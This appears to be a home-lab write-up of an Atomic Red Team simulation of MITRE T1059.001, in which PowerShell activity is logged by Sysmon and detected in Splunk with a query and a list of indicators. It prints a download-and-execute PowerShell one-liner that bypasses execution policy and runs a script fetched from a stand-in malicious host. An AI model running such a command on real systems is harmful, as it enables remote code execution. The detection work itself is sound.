# T1059.001 ‚Äì PowerShell Execution (Atomic Red Team)

**MITRE Technique**: [T1059.001 ‚Äì Command and Scripting Interpreter: PowerShell](https://attack.mitre.org/techniques/T1059/001/)

This attack simulates malicious PowerShell execution using Atomic Red Team on a domain-joined Windows 10 machine. The purpose is to test endpoint visibility using Sysmon and log detection with Splunk.

---

## üéØ Description

We use an Atomic Red Team payload to simulate a fileless PowerShell attack that downloads and runs a script remotely. This simulates common adversary behavior seen in malware, ransomware loaders, and APTs.

### Atomic Command Used:

```powershell
powershell.exe -nop -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://malicious[.]domain/script.ps1')"
```

This payload:

* Bypasses PowerShell execution policies
* Uses `IEX` (Invoke-Expression) to run code from memory
* Pulls down remote scripts using `Net.WebClient`

---

## üîç Detection in Splunk

### Tools Involved:

* Sysmon installed on Windows 10
* Splunk Universal Forwarder running on the same host
* Splunk Enterprise server receiving and indexing logs
* Atomic Red Team running directly on the Windows target

### Detection Method:

* **Sysmon Event ID 1** logs all process creations, including full PowerShell command lines
* Splunk ingests these logs under sourcetype `WinEventLog:Microsoft-Windows-Sysmon/Operational`

### Splunk Detection Query:

```splunk
index=endpoint sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational"
| search CommandLine="*powershell*"
| table _time, Computer, User, CommandLine
```

### What to Look For:

* Use of `-nop`, `-exec bypass`
* `IEX`, `Net.WebClient`, or `DownloadString`
* Long base64 or obfuscated strings

---

## ‚úÖ Result

* The attack was logged by Sysmon and successfully forwarded to Splunk.
* Analysts can see full command line arguments in Splunk's search.
* The query clearly shows the suspicious PowerShell activity.

---

## üì∏ Screenshots

### 1. PowerShell attack launched from ART:

**File:** `T1059.001 attack.PNG`
![PowerShell Attack](../../attacks/T1059.001-powershell/screenshots/T1059.001%20attack.PNG)

### 2. Splunk confirms detection:

**File:** `shows that T1059.001 can spot this kind of attack.PNG`
![Detection Confirmed](../../attacks/T1059.001-powershell/screenshots/shows%20that%20T1059.001%20can%20spot%20this%20kind%20of%20attack.PNG)

### 3. Manual search for PowerShell:

**File:** `we can search powershell as well to see.PNG`
![Search PowerShell](../../attacks/T1059.001-powershell/screenshots/we%20can%20search%20powershell%20as%20well%20to%20see.PNG)

### 4. Explanation of what the command does:

**File:** `what the command does.PNG`
![Command Explained](../../attacks/T1059.001-powershell/screenshots/what%20the%20command%20does.PNG)

### 5. What to look for in command line activity:

**File:** `what to look for in powershell.PNG`
![Indicators](../../attacks/T1059.001-powershell/screenshots/what%20to%20look%20for%20in%20powershell.PNG)
